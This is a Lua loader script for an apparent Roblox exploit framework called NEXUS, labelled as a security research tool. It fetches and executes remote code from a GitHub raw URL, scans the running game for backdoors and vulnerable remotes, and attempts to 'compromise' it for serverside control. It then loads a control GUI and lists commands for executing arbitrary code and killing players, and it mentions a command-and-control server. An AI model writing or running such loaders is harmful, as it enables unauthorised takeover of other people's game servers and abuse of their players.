--[[
    ╔═══════════════════════════════════════════════╗
    ║               NEXUS v2.0                       ║
    ║   Advanced Serverside Research Framework       ║
    ║            Standalone Loader                   ║
    ╚═══════════════════════════════════════════════╝
    
    Professional security research tool for Roblox
    Built for game developers and security researchers
    
    Features:
    • Deep vulnerability scanning
    • Admin system detection
    • Serverside execution
    • Professional UI
    • Real-time monitoring
    
    Toggle GUI: Right Shift
]]

local function loadNexus()
    print([[
    ╔═══════════════════════════════════════════════╗
    ║               NEXUS v2.0                       ║
    ║   Advanced Serverside Research Framework       ║
    ║            Loading, please wait...             ║
    ╚═══════════════════════════════════════════════╝
    ]])
    
    -- Configuration (update YOUR_USERNAME with your GitHub username)
    local GITHUB_REPO = "YOUR_USERNAME/ProjectNexus"
    local GITHUB_BRANCH = "main"
    local GITHUB_BASE = string.format("https://raw.githubusercontent.com/%s/%s/", GITHUB_REPO, GITHUB_BRANCH)
    
    -- Load main module with cache buster
    print("[NEXUS] Loading core framework...")
    local cacheBuster = "?v=" .. tostring(math.random(100000, 999999))
    
    local success, Nexus = pcall(function()
        return loadstring(game:HttpGet(GITHUB_BASE .. "main.lua" .. cacheBuster))()
    end)
    
    if not success then
        warn("[NEXUS] Failed to load main module")
        warn("[NEXUS] Error: " .. tostring(Nexus))
        warn("[NEXUS] Please check:")
        warn("[NEXUS]   1. Repository is public")
        warn("[NEXUS]   2. GITHUB_REPO is correct")
        warn("[NEXUS]   3. All files are pushed to GitHub")
        return
    end
    
    if not Nexus then
        warn("[NEXUS] Main module returned nil - check main.lua syntax")
        return
    end
    
    print("[NEXUS] ✓ Core framework loaded")
    
    -- Create instance in standalone mode (no C&C required)
    print("[NEXUS] Initializing in standalone mode...")
    local instance = Nexus.new({
        commandServer = "http://localhost:8080",  -- Not used in standalone
        autoScan = false,
        persistentMode = true
    })
    
    print("[NEXUS] ✓ Instance created")
    print("")
    
    -- Run vulnerability scan
    print("[NEXUS] Scanning current game for vulnerabilities...")
    print("[NEXUS] This may take 10-30 seconds depending on game size...")
    local scanResults = instance:ScanCurrentGame()
    
    if scanResults then
        print("[NEXUS] ✓ Scan complete")
        print(string.format("[NEXUS] Rating: %s | Confidence: %s | Score: %d", 
            scanResults.rating, scanResults.confidence, scanResults.score))
        print(string.format("[NEXUS] Found: %d backdoors, %d admin systems, %d vulnerable remotes", 
            #scanResults.backdoors, #scanResults.adminSystems, #scanResults.remotes))
    else
        warn("[NEXUS] Scan failed - check console for errors")
    end
    
    print("")
    
    -- Attempt compromise
    print("[NEXUS] Attempting to establish serverside access...")
    spawn(function()
        task.wait(1)
        
        local compromised = instance:Compromise()
        
        if compromised then
            print("[NEXUS] ═══════════════════════════════════════")
            print("[NEXUS] ✓ SERVERSIDE ACCESS ESTABLISHED")
            print("[NEXUS] ✓ Full game control achieved")
            print("[NEXUS] ═══════════════════════════════════════")
            
            -- Load GUI
            print("[NEXUS] Loading control interface...")
            local guiSuccess, GUI = pcall(function()
                return loadstring(game:HttpGet(GITHUB_BASE .. "client/gui.lua" .. cacheBuster))()
            end)
            
            if guiSuccess and GUI then
                local gui = GUI.new()
                gui:Create()
                print("[NEXUS] ✓ GUI loaded successfully")
                print("[NEXUS] Press Right Shift to toggle interface")
                
                -- Store GUI globally
                _G.NexusGUI = gui
                
                -- Toggle keybind
                local UserInputService = game:GetService("UserInputService")
                UserInputService.InputBegan:Connect(function(input, gameProcessed)
                    if not gameProcessed and input.KeyCode == Enum.KeyCode.RightShift then
                        gui:Toggle()
                    end
                end)
            else
                warn("[NEXUS] Failed to load GUI: " .. tostring(GUI))
            end
        else
            warn("[NEXUS] ═══════════════════════════════════════")
            warn("[NEXUS] ✗ Compromise failed")
            warn("[NEXUS] No exploitable vectors found")
            warn("[NEXUS] ═══════════════════════════════════════")
            warn("[NEXUS] This game may be:")
            warn("[NEXUS]   • Properly secured")
            warn("[NEXUS]   • Using current security patches")
            warn("[NEXUS]   • Free of vulnerable backdoors")
            warn("[NEXUS] ")
            warn("[NEXUS] You can still:")
            warn("[NEXUS]   • View scan results via _G.NexusInstance")
            warn("[NEXUS]   • Analyze vulnerabilities manually")
        end
    end)
    
    -- Export to globals
    _G.Nexus = Nexus
    _G.NexusInstance = instance
    
    print("")
    print("[NEXUS] ═══════════════════════════════════════")
    print("[NEXUS] Nexus v2.0 loaded successfully")
    print("[NEXUS] ═══════════════════════════════════════")
    print("[NEXUS] Access via: _G.NexusInstance")
    print("[NEXUS] ")
    print("[NEXUS] Quick Commands:")
    print("[NEXUS]   _G.NexusInstance:ScanCurrentGame()")
    print("[NEXUS]   _G.NexusInstance:Compromise()")
    print("[NEXUS]   _G.NexusInstance:Execute([[code]])")
    print("[NEXUS]   _G.NexusInstance:Command('kill', 'player')")
    print("[NEXUS] ")
    print("[NEXUS] Documentation:")
    print("[NEXUS]   github.com/" .. GITHUB_REPO)
    print("[NEXUS] ═══════════════════════════════════════")
    
    return instance
end

return loadNexus()
